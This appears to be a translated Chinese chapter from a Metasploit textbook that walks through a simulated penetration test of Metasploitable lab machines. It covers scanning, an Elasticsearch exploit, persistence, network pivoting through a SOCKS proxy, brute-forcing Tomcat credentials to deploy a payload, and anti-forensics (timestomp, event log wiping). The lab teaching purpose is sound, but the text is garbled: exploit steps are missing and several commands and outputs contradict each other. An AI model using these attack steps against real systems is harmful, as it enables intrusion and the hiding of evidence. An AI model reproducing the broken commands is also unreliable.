# 第15章：模拟渗透测试

在渗透测试中成功绕过组织的防御是最有成就感的经历之一。在本章中，我们将整合你在前几章中学到的知识，模拟一次完整的渗透测试。你将重现前面章节中介绍过的步骤，因此我们展示的大部分内容你应该都很熟悉。

开始之前，请启动 Linux 和 Windows Metasploitable 两台虚拟机。如果你需要重新设置这些机器，请按照附录 A 中的说明操作。我们将同时运行两台机器来模拟一个小型网络环境，将 Windows 虚拟机配置为面向互联网的系统，并将 Linux 机器置于其后方作为内部网络主机。

## 注

本章中的模拟渗透测试规模较小。如果你的目标是大公司，你会进行更深入的练习。我们保持这个示例简单，以便你轻松复现。

## 交互前参与

规划是参与前阶段的第一步。在真正的规划阶段，我们会确定目标和主要的攻击方法，可能包括社会工程学、无线网络、互联网或内部资源等途径。

就本次模拟而言，我们将以受保护的 Metasploitable 虚拟机为目标，其 IP 地址为 192.168.57.4，该虚拟机连接到一个内部网络，受防火墙保护，并且不直接连接到互联网。将 Windows 机器置于防火墙后面，仅开放端口 80 和 9200，IP 地址为 10.0.2.15，并将 Metasploitable 机器放在内部网络上，如图 15-1 所示。

## 情报收集

下一步是情报收集，这是过程中最重要的阶段之一，因为如果你在这里遗漏了什么，就可能错过整个攻击途径。我们此时的目标是确定如何获得对系统的访问权限。

我们首先使用隐蔽的 SYN 扫描对 Windows 虚拟机进行基本的 Nmap 扫描，这种扫描通常可以在不触发防御的情况下检测端口。大多数入侵防御系统（IPS）可以识别端口扫描，但由于它们非常普遍，通常被视为常规噪音，如果不是非常激进，就会被忽略。也就是说，客户可能会标记它们，因此在隐蔽行动中最好避免使用：

```sh
kali@kali:~$ sudo nmap -sS -Pn-65535 10.0.2.15
Starting Nmap (http://nmap.org)
Nmap scan report for 10.0.2.15
Host is up (0.00071s latency).
Not shown: 999 filtered ports
PORT     STATE SERVICE
80/tcp   open  http
9200/tcp open  wap-wsp

Nmap done: 1 IP address (1 host up) scanned in 17.46 seconds
```

在攻击面向互联网的系统时，你会经常看到这样的输出，其中许多系统限制了互联网用户可以访问的端口。在此示例中，我们发现端口 80（标准 HTTP 端口）上似乎运行着一个 Web 服务器。我们还在端口 9200 上看到名为 `wap-wsp` 的服务。

请注意，如果你正在进行不担心被检测到的公开测试，你可以运行如下 Nmap 扫描：

```bash
kali@kali:~$ sudo nmap -sC -sV -vv -Pn -65535 10.0.2.15
```

`-sC` 标志运行默认脚本，`-sV` 标志提取版本信息，`-vv` 标志告诉 Nmap 打印详细输出，其中包含诸如数据包的生存时间（TTL）等信息。查看 TTL 可以帮助你猜测应用程序是否在 Docker 容器中运行。

## 注

Nmap 的开发人员在其网站上维护了一个防火墙绕过功能列表：https://nmap.org/book/man-bypass-firewalls-ids.html。

## 威胁建模

确定了端口 80 和 9200 开放后，我们可以枚举任何其他可用的系统，但由于我们只对一个目标感兴趣，让我们继续进行威胁建模，并尝试确定进入该系统的最佳途径。

我们可以选择通过使用 Nmap 执行版本扫描来更深入地探索端口 80 上的 Web 服务器。但在深入研究一个选项之前，让我们检查所有可用的途径。尝试打开与端口 9200 关联的网页。如图 15-2 所示，该端口看起来与一个 Web 服务相关联。

```sh
msf exploit(multi/elasticsearch/script_mvel_rce) > set LPORT 443
```

现在我们有了一个 shell 会话，让我们将其升级到 x64 Meterpreter 会话并建立持久化。为此，运行 `sessions -u <会话ID>` 命令：

```sh
msf post(windows/gather/arp_scanner) > sessions -u 1
```

我们现在有了一个以 root 权限运行的升级会话。我们可能还想做的另一件事是建立持久化，以便即使在漏洞已被修补且系统已重启的情况下也能保持访问。为此，尝试运行第 6 章中讨论的持久化后渗透脚本之一。接下来，我们将研究如何获得对内部网络上 Linux 系统的访问权限。

## 后渗透

既然我们已经攻破了面向互联网的主机，让我们检查它是否也连接到内部网络。我们可以通过在 Meterpreter 会话中运行 `ipconfig` 命令来实现：

```sh
meterpreter> ipconfig
```

输出应该显示 Windows 机器同时连接到面向互联网的网络和一个内部网络。

## 注

如果你没有看到两个接口，则你的 Windows 机器当前未设置为双宿主机器。请确保你的虚拟机或 Docker 容器至少连接到两个接口。

我们现在可以使用 `autoroute` 模块在两个接口之间建立路由，该模块使用 Rex Socket 库将路由添加到 Metasploit 的内部路由表中。这些路由允许渗透测试人员轻松地将数据包从一个接口传递到另一个接口：

```sh
msf > use post/multi/manage/autoroute
msf post(multi/manage/autoroute) > set SESSION 2
SESSION => 2
msf post(multi/manage/autoroute) > set SUBNET 192.168.0.0
SUBNET => 169.254.0.0
msf post(multi/manage/autoroute) > set NETMASK /16
NETMASK => /1
msf post(multi/manage/autoroute) > run
[+] Route added to subnet 10.0.2.0/255.255.255.0 from host's routing table.
[+] Route added to subnet 192.168.57.0/255.255.255.0 from host's routing table.
```

现在，Meterpreter 会话通过 `multi/manage/autoroute` 模块授予我们对内部网络的访问权限，以便我们可以使用受感染的 Windows 目标作为发起点来扫描和利用内部主机。

## 扫描 Linux 系统

我们实际上已连接到内部网络，因此应该能够访问 Linux 系统。让我们从地址解析协议（ARP）扫描开始，它通过向子网中的所有 IP 地址发送 ARP 请求来检测机器。ARP 请求包查询网络中其他机器的 MAC 地址。如果网络上存在某台机器，它将使用 ARP 回复包进行响应：

```sh
msf > use auxiliary/windows/gather/arp_scanner
msf post(windows/gather/arp_scanner) > set session 2
session => 2
msf post(windows/gather/arp_scanner) > run
[*] Running module against METASPLOITABLE3
[*] ARP Scanning 192.168.57.0/24
[+] IP: 192.168.57.4 MAC 08:00:27:ce:4b:57 (CADMUS COMPUTER SYSTEMS)
[+] IP: 192.168.57.3 MAC 08:00:27:fc:39:f1 (CADMUS COMPUTER SYSTEMS)
```

看起来我们找到了另外几台机器！经检查，IP 地址 192.168.57.4 是 Windows 机器的内部网络地址，而 192.168.57.3 是 Linux 目标的 IP 地址。现在让我们执行端口扫描，查看 Linux 目标上有什么应用程序。

虽然你可能希望使用 Nmap 进行此扫描，但在受感染主机上安装该工具可能会导致我们被检测到。相反，我们将使用 SOCKS 和代理链将 Nmap 扫描从攻击者机器路由，经过受感染主机，进入内部网络。SOCKS 协议允许我们通过第三方将 TCP 和 UDP 流量转发到另一个 IP 地址。

我们首先启动 SOCKS 代理服务器，它将充当第三方：

```sh
msf > use auxiliary/server/socks_proxy
msf auxiliary(server/socks_proxy) > options

Module options (auxiliary/server/socks_proxy):
   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD                    no        Proxy password for SOCKS5 listener
   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address...
   SRVPORT    1080             yes       The port to listen on
   USERNAME                    no        Proxy username for SOCKS5 listener
   VERSION                     5         yes       The SOCKS version to use (Accepted: 4a, 5)

Auxiliary action:
   Name   Description
   ----   -----------
   Proxy  Run a SOCKS proxy server
msf auxiliary(server/socks_proxy) > set SRVHOST 127.0.0.1
SRVHOST => 127.0.0.1
msf auxiliary(server/socks_proxy) > run
```

接下来，我们将使用 ProxyChains 工具作为 SOCKS 客户端，以便连接到刚刚创建的代理服务器。我们将在 Kali Linux 机器上的端口 1080 上运行该客户端。运行后，我们将把 Nmap 扫描产生的 TCP 和 UDP 数据包通过端口 1080 上的代理客户端转发到受感染机器上运行的代理服务器，然后代理服务器再将数据包转发到内部网络。

通过按如下方式编辑 `/etc/proxychains.conf` 配置文件，告诉代理链工具使用端口 1080：

```bash
kali@kali:~$ sudo nano /etc/proxychains.conf
```

编辑后的文件中最后几行应如下所示：

```text
# add proxy here ...
# meanwhile
# defaults set to "tor"
socks5 127.0.0.1 1080
```

现在我们已经配置好了 ProxyChains，让我们使用它来路由 Nmap 流量：

```sh
kali@kali:~$ sudo proxychains nmap -A -n -sT -Pn 192.168.57.
3
...
```

你应该会看到一系列开放的端口。根据 Nmap 的操作系统检测，我们也能确认被扫描的系统是某种 Unix/Linux 变体。其中一些端口应该会立刻引起你的注意，例如 FTP、SSH、HTTP 和 MySQL 的端口，因为这些端口可能为我们提供进一步利用的机会。

请注意，除了运行 Nmap 之外，你还可以将 ProxyChains 用于其他目的。每当你想使用某个工具而不必将其安装在受感染主机上时，请考虑使用它。

## 识别易受攻击的服务

因为有几个端口看起来很有趣，我们将开始对每个端口进行横幅抓取，以尝试找到进入系统的方法：

```sh
msf > use auxiliary/scanner/ftp/ftp_version
msf auxiliary(ftp_version) > set RHOSTS 192.168.57.3
RHOSTS => 192.168.57.3
msf auxiliary(ftp_version) > run

[*] 192.168.57.3:21 FTP Banner: '220 (vsFTPd)::ffff:192.168.57.3]\x0d\x0a'
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(ftp_version) >
```

我们现在知道端口 21 上运行着 vsFTPd。接下来，我们使用 SSH 来了解有关目标的更多信息。（添加 `-v` 标志会提供详细输出。）以下列表告诉我们，目标正在运行一个专门为 Ubuntu 编写的旧版本 OpenSSH：

```sh
msf > ssh 192.168.57.3 -v
[*] exec: ssh 192.168.57.3 -v

OpenSSH_9.0p1 Debian-3ubuntu1, OpenSSL 3.0.7
```

继续对我们在目标上发现的所有端口执行此过程。各种辅助模块可以帮助你收集有关目标系统的信息。完成后，你应该有一个系统上运行的软件版本列表，并且在选择漏洞时会使用这些信息。我们现在可以开始利用内部网络中的目标。

## 攻击 Apache Tomcat

在研究过程中，我们注意到该系统上存在大量漏洞，包括直接利用和暴力破解的可能性。我们注意到 Apache Tomcat 安装在端口 8180 上，如我们之前的端口扫描所示。经过一番互联网研究，我们了解到 Tomcat 容易受到管理界面暴力破解攻击。（在大多数情况下，我们可以使用 exploit-db 或 Google 来识别每个服务中潜在的漏洞。）

对目标上运行的 Apache Tomcat 安装版本进行进一步研究表明，这是入侵系统的最佳途径。如果我们能够通过 Tomcat 的管理功能，就可以使用 HTTP PUT 方法将我们的 payload 部署到易受攻击的系统上。我们按如下方式发起攻击（为简洁起见，我们省略了模块列表）：

```sh
msf > search apache
...
msf auxiliary(tomcat_mgr_login) > set THREADS 50
THREADS => 50
msf auxiliary(tomcat_mgr_login) > set RPORT 8180
RPORT => 8180
msf auxiliary(tomcat_mgr_login) > set VERBOSE false
VERBOSE => false
msf auxiliary(tomcat_mgr_login) > set STOP_ON_SUCCESS true
STOP_ON_SUCCESS => true

msf auxiliary(tomcat_mgr_login) > run

[+] http://192.168.57.3:8180/manager/html [Apache-Coyote/1.1] [Tomcat Application Manager] successful login 'tomcat': 'tomcat'
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(tomcat_mgr_login) >
```

我们的暴力破解攻击成功；我们发现了 Tomcat 服务器的用户名和密码。但我们还没有获得 shell。

利用新发现的凭据，我们使用 `multi/http/tomcat_mgr_deploy` 漏洞利用 Apache 的 HTTP PUT 功能，使用我们通过暴力破解登录发现的合法用户名和密码将我们的 payload 放置到系统上：

```sh
msf auxiliary(tomcat_mgr_login) > use exploit/multi/http/tomcat_mgr_deploy
msf exploit(tomcat_mgr_deploy) > set HttpPassword tomcat
HttpPassword => tomcat
msf exploit(tomcat_mgr_deploy) > set HttpUsername tomcat
HttpUsername => tomcat
msf exploit(tomcat_mgr_deploy) > set RHOST 192.168.57.3
RHOST => 192.168.57.3
msf exploit(tomcat_mgr_deploy) > set LPORT 9999
LPORT => 9999
msf exploit(tomcat_mgr_deploy) > set RPORT 8180
RPORT => 8180
...
meterpreter > shell
Process 1 created.
Channel 1 created.
whoami
tomcat55
ls /root
Desktop
reset_logs.sh
vnc.log
mkdir /root/moo.txt
mkdir: cannot create directory '/root/moo.txt': Permission denied
```

请注意输出的最后一行：我们无法写入 root 文件夹，因为我们是从受限用户帐户运行的，而此文件夹需要 root 级别的权限。通常，Apache 在 Apache 用户帐户下运行，该帐户有时称为 `apache`，但也可能是 `httpd` 或 `www-data` 等名称。根据我们对目标上使用的操作系统版本的了解，我们可以使用本地权限提升技术来获得进一步的 root 访问权限。但由于我们已经拥有一些基本访问权限，让我们尝试几种不同的攻击。

## 注

要无需权限提升即可获得对 Metasploitable 的 root 访问权限，请查看 https://www.exploit-db.com/exploits/5720 上的 SSH 可预测 PRNG 漏洞。

## 攻击非主流服务

当我们执行默认的 Nmap 端口扫描时，并未包括所有可能的端口。由于我们现在已经获得了对系统的初步访问权限，可以输入 `netstat -antp` 并注意到 Nmap 未扫描的其他端口。（请记住，在渗透测试中，我们不能总是依赖默认设置来取得成功。）

我们的扫描发现端口 3632 处于开放状态，并与 DistCC 相关联。在线搜索告诉我们，DistCC 是一个将 C/C++ 代码构建分发到网络上多台机器的程序，并且容易受到攻击。在执行渗透测试时，你经常会遇到不熟悉的应用程序和产品，你需要先研究应用程序，然后才能攻击它。

```sh
mkdir: cannot create directory '/root/moo': Permission denied
```

但请注意，我们仍然不是 root。本地权限提升漏洞可以进一步入侵系统并让你获得完整的 root 访问权限。我们不会在这里告诉你如何实现这一点；请使用你在本书中学到的知识并搜索 Exploit Database 来找到答案。

## 清理痕迹

完成这些攻击后，下一步是返回每个被利用的系统，清除你的痕迹并清理你留下的任何混乱。你应该删除 Meterpreter shell 或其他恶意软件的任何残留物，以避免进一步暴露系统，因为攻击者可能使用漏洞代码来入侵系统。

此外，如果你正在测试受感染系统的取证分析或事件响应程序，你的目标可能是阻止任何取证分析或入侵检测系统（IDS）。通常很难隐藏所有痕迹，但你应该能够操纵系统以迷惑检查人员，使其几乎无法确定攻击的范围。

阻止取证分析的最佳方法是完全擦除系统并重建，删除所有痕迹。但是，在渗透测试期间，你很少能够做到这一点。在大多数情况下，你可以篡改系统，使检查人员的大部分工作无法得出结论。他们很可能会确定系统已被感染或入侵，但可能无法了解你从中提取了多少信息。

我们在几章中讨论过的 Meterpreter 的一个好处是它能够纯粹地驻留在内存中。通常，防御者发现检测和响应内存空间中的 Meterpreter 具有挑战性，尽管研究经常提出检测 Meterpreter payload 的方法，但 Metasploit 团队通常会以隐藏 Meterpreter 的新方法作为回应。

这与防病毒软件供应商对 Meterpreter 新版本玩的猫捉老鼠游戏相同。当开发人员发布新的编码器或混淆 payload 的方法时，供应商可能需要几个月的时间来检测问题并更新其产品签名以捕获它们。在大多数情况下，取证分析师很难识别来自 Metasploit 的纯内存驻留攻击向量。

我们不会提供关于清除痕迹的深入信息，但有几个 Metasploit 功能值得一提：`timestamp` 和 `event_manager`。`timestamp` 是一个 Meterpreter 插件，允许你修改、擦除或设置文件的某些属性。让我们首先运行 `timestamp`：

```sh
meterpreter > timestamp info

Usage: timestamp file_path OPTIONS

OPTIONS:

    -a <opt>   Set the "last accessed" time of the file
    -b         Set the MACE timestamps so that EnCase shows blanks
    -c <opt>   Set the "creation" time of the file
    -e <opt>   Set the "mft entry modified" time of the file
    -f <opt>   Set the MACE of attributes equal to the supplied file
    -h         Help banner
    -m <opt>   Set the "last written" time of the file
    -r         Set the MACE timestamps recursively on a directory
    -v         Display the UTC MACE values of the file
...
meterpreter > timestomp C:\\boot.ini -b
```

在这个例子中，我们更改了时间戳，这样当防御者运行 Encase（一款流行的取证分析工具）时，时间戳会显示为空白。工具 `event_manager` 将修改事件日志，使其不显示任何可能揭示攻击发生的信息。下面是它的实际运行情况：

```sh
...
meterpreter > run event_manager -i
...
meterpreter > run event_manager -c
...
```

在此示例中，我们清除了所有事件日志。尽管检查人员可能会注意到系统上其他可能提醒他们遭到攻击的有趣事情，但他们通常无法拼凑出谜团以确定发生了什么，即使他们能判断出发生了不好的事情。

请记住记录对目标系统的更改，以便更容易清除痕迹。通常，你会留下一小点信息在系统上，所以你不妨让事件响应和取证分析团队极难找到它。

## 总结

做到这一步，我们可以继续使用 Metasploit 和 Meterpreter 攻击内部网络上的其他机器，仅受限于我们的创造力和能力。如果这是一个更大的网络，我们可以使用从网络上各种系统收集的信息进一步渗透它。

例如，在本章前面，我们入侵了一个基于 Windows 的系统。我们可以使用 Meterpreter 控制台从该系统中提取哈希值，然后使用这些凭据对其他基于 Windows 的系统进行身份验证。本地管理员帐户几乎总是从一个系统到另一个系统都相同，因此即使在企业环境中，我们也可以使用来自一个系统的信息将攻击桥接到另一个系统。

渗透测试需要你跳出框框思考，并将拼图的各个部分组合起来。我们在本章中使用了一种方法，但可能有几种不同的方法进入系统，以及你可以利用的不同攻击途径。这一切都来自于经验和花时间发挥创造力。坚持不懈是渗透测试的关键。

请记住建立一套你熟悉的基本方法论，但根据需要对其进行更改。通常，渗透测试人员每次测试至少更改一次他们的方法论以保持新鲜感。更改可能包括攻击系统的新方法或使用新方法。无论你选择哪种方法，请记住，只要有一点经验和努力工作，你在这个领域就能完成任何事情。
